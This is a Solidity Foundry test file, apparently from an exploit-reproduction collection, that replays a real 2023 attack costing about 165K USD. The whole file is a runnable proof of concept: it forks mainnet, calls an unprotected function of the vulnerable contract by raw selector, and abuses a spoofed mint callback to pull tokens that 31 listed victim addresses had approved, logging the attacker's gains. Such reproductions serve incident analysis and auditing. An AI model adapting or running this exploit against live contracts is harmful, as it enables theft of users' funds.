// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~165K USD$
// Attacker : https://etherscan.io/address/0xc0ccff0b981b419e6e47560c3659c5f0b00e4985
// Attack Contract : https://etherscan.io/address/0xf466f9f431aea853040ef837626b1c59cc963ce2
// Vulnerable Contract : https://etherscan.io/address/0x7caec5e4a3906d0919895d113f7ed9b3a0cbf826
// Attack Tx : https://etherscan.io/tx/0xc42fc0e22a0f60cc299be80eb0c0ddce83c21c14a3dddd8430628011c3e20d6b

// @Analysis
// https://twitter.com/HypernativeLabs/status/1677529544062803969
// https://twitter.com/BeosinAlert/status/1677548773269213184

interface ICiv {
    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract ContractTest is Test {
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 BONE = IERC20(0x9813037ee2218799597d83D4a5B6F3b6778218d9);
    IERC20 WOOF = IERC20(0x6BC08509B36A98E829dFfAD49Fde5e412645d0a3);
    IERC20 LEASH = IERC20(0x27C70Cd1946795B66be9d954418546998b546634);
    IERC20 SANI = IERC20(0x4521C9aD6A3D4230803aB752Ed238BE11F8B342F);
    IERC20 ONE = IERC20(0x73A83269b9bbAFC427E76Be0A2C1a1db2a26f4C2);
    IERC20 CELL = IERC20(0x26c8AFBBFE1EBaca03C2bB082E69D0476Bffe099);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 SHIB = IERC20(0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE);
    ICiv VulnerableContract = ICiv(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address[] victims = [
        0x18b5f62c3830668D64F859A5a71511B2132075F1,
        0x22F6b9Cc8E670f6Ad4F43896edeC7E98eae8B6A1,
        0x783e2F71d8967BDEE8Aa2bA0f3B9f402Ac871365,
        0x8F159f13f64dB18B8A0742c86Fa8B225CeAd6C5d,
        0x6a6597CD92D2A78101CC7f2d3BEf3BBfa264f09C,
        0x899b11881f977AEb5D9Fac5105ce62c877f11763,
        0x4035918D8e0231D6bF5fFB72Add9EDC917DCfcfa,
        0x46DaD8f630736C7265849422F943efD77CB8714f,
        0x7b05363f549c929C3dA930f6728e3D74806E4103,
        0xC21A3B81Efbba41DD319191b07A20eB1f5EeBd61,
        0x26d61E57C44525d25AAD4ef20bcE3F7aA9D64C4c,
        0x71f69A5611375DC6FCBe72044b0a2363fCb0d967,
        0xC5CC992AAf6ECaC0a1074fa4435ac36FD51FFEEd,
        0x498C3274D8DdEe9e1C727f31232e2e41Ab55BAf9,
        0x7b05363f549c929C3dA930f6728e3D74806E4103,
        0x32923bF50f9D4D182c9dc09A66fB9167b9AB91bF,
        0x0a78FBeb89EE251C0d78E0eeB5E6bb7524A8939f,
        0xCfd3eF97272777F6D814344AE93dd6C69b27f214,
        0x0e1DF04fea7411A393f5Ac2a1907b5e292280bfa,
        0xD156a9E6F661F4Ea23B21dbDddB1a39dBeA63e65,
        0x512e9701D314b365921BcB3b8265658A152C9fFD,
        0xbc1843A7dAa380D4e7412D829Adc85627c3f0eD9,
        0x853fd548dE9a1b8F94BcFF480DD9fEa6E0f20BB0,
        0xF2cdD8b147802a07F862C9dc125190e0653795a2,
        0x526FeE3a5EE9913019Fa943668F0A8712e6349A6,
        0xe0643f2C33F5a7A97B25129F0552f2f1a45Fc4BA,
        0x7e585B185fC67BC5f815B7Abf459300418Aa9f97,
        0x9EAaeaB7255296E68Ad1F12b969B9e30D1806c9d,
        0x5c7F06399ffD6707a8FCAF248661aBAbF160CD63,
        0xc0E3424A3B43bfd86a125a2C9704ce445fFc8bb8,
        0x3C0F97eBc34aD870414176e5e9126f31166eC1A9
    ];
    // The assets of the above addresses. victims[counter] : victimsAssets[counter]
    IERC20[] victimsAssets = [
        USDT,
        USDT,
        BONE,
        WOOF,
        LEASH,
        SANI,
        USDT,
        USDT,
        USDT,
        ONE,
        CELL,
        USDT,
        USDT,
        USDT,
        USDC,
        SHIB,
        ONE,
        LEASH,
        USDT,
        USDT,
        ONE,
        USDT,
        USDT,
        ONE,
        USDT,
        USDT,
        ONE,
        SANI,
        USDT,
        USDT,
        USDT
    ];
    // Helper variable (for orientation). Which token and how much to steal from the next victim
    uint256 private counter = 0;

    function setUp() public {
        cheats.createSelectFork("mainnet", 17_646_141);
        cheats.label(address(USDT), "USDT");
        cheats.label(address(BONE), "BONE");
        cheats.label(address(LEASH), "LEASH");
        cheats.label(address(SANI), "SANI");
        cheats.label(address(ONE), "ONE");
        cheats.label(address(CELL), "CELL");
        cheats.label(address(USDC), "USDC");
        cheats.label(address(SHIB), "SHIB");
    }

    function testExploit() public {
        // Step 1. Call vulnerable contract function which have no access controll
        for (uint256 i; i < victims.length; ++i) {
            callVulnerableContract();
        }

        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker BONE balance after exploit", BONE.balanceOf(address(this)), BONE.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker WOOF balance after exploit", WOOF.balanceOf(address(this)), WOOF.decimals()
        );

        emit log_named_decimal_uint(
            "Attacker LEASH balance after exploit", LEASH.balanceOf(address(this)), LEASH.decimals()
        );

        emit log_named_decimal_uint(
            "Attacker SANI balance after exploit", SANI.balanceOf(address(this)), SANI.decimals()
        );

        emit log_named_decimal_uint("Attacker ONE balance after exploit", ONE.balanceOf(address(this)), ONE.decimals());

        emit log_named_decimal_uint(
            "Attacker CELL balance after exploit", CELL.balanceOf(address(this)), CELL.decimals()
        );

        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );

        emit log_named_decimal_uint(
            "Attacker SHIB balance after exploit", SHIB.balanceOf(address(this)), SHIB.decimals()
        );
    }

    // Step 2. This function will be called from vulnerable contract (after step 1).
    // In the body of the function attacker call uniswapV3MintCallback() to transfer the funds approved by other users.
    function mint(
        address recipient,
        int24 tickLower,
        int24 tickUpper,
        uint128 amount,
        bytes calldata data
    ) external returns (uint128 amount0, uint128 amount1) {
        if (counter == 0) {
            uniswapV3MintCallback(0);
        } else if (counter == 1) {
            uniswapV3MintCallback(1);
        } else if (counter == 2) {
            uniswapV3MintCallback(2);
        } else if (counter == 3) {
            uniswapV3MintCallback(3);
        } else if (counter == 4) {
            uniswapV3MintCallback(4);
        } else if (counter == 5) {
            uniswapV3MintCallback(5);
        } else if (counter == 6) {
            uniswapV3MintCallback(6);
        } else if (counter == 7) {
            uniswapV3MintCallback(7);
        } else if (counter == 8) {
            uniswapV3MintCallback(8);
        } else if (counter == 9) {
            uniswapV3MintCallback(9);
        } else if (counter == 10) {
            uniswapV3MintCallback(10);
        } else if (counter == 11) {
            uniswapV3MintCallback(11);
        } else if (counter == 12) {
            uniswapV3MintCallback(12);
        } else if (counter == 13) {
            uniswapV3MintCallback(13);
        } else if (counter == 14) {
            uniswapV3MintCallback(14);
        } else if (counter == 15) {
            uniswapV3MintCallback(15);
        } else if (counter == 16) {
            uniswapV3MintCallback(16);
        } else if (counter == 17) {
            uniswapV3MintCallback(17);
        } else if (counter == 18) {
            uniswapV3MintCallback(18);
        } else if (counter == 19) {
            uniswapV3MintCallback(19);
        } else if (counter == 20) {
            uniswapV3MintCallback(20);
        } else if (counter == 21) {
            uniswapV3MintCallback(21);
        } else if (counter == 22) {
            uniswapV3MintCallback(22);
        } else if (counter == 23) {
            uniswapV3MintCallback(23);
        } else if (counter == 24) {
            uniswapV3MintCallback(24);
        } else if (counter == 25) {
            uniswapV3MintCallback(25);
        } else if (counter == 26) {
            uniswapV3MintCallback(26);
        } else if (counter == 27) {
            uniswapV3MintCallback(27);
        } else if (counter == 28) {
            uniswapV3MintCallback(28);
        } else if (counter == 29) {
            uniswapV3MintCallback(29);
        } else {
            uniswapV3MintCallback(30);
        }
        ++counter;
        return (10, 11);
    }

    function token1() external view returns (address) {
        return address(victimsAssets[counter]);
    }

    function callVulnerableContract() internal {
        (bool success, bytes memory retData) = address(VulnerableContract).call(
            abi.encodeWithSelector(bytes4(0x5ffe72b7), 0, 0, 0, address(this), 0, 0, 0)
        );
        require(success);
    }

    function uniswapV3MintCallback(uint256 num) internal {
        VulnerableContract.uniswapV3MintCallback(
            0, victimsAssets[num].balanceOf(victims[num]), abi.encode(victims[num])
        );
    }
}
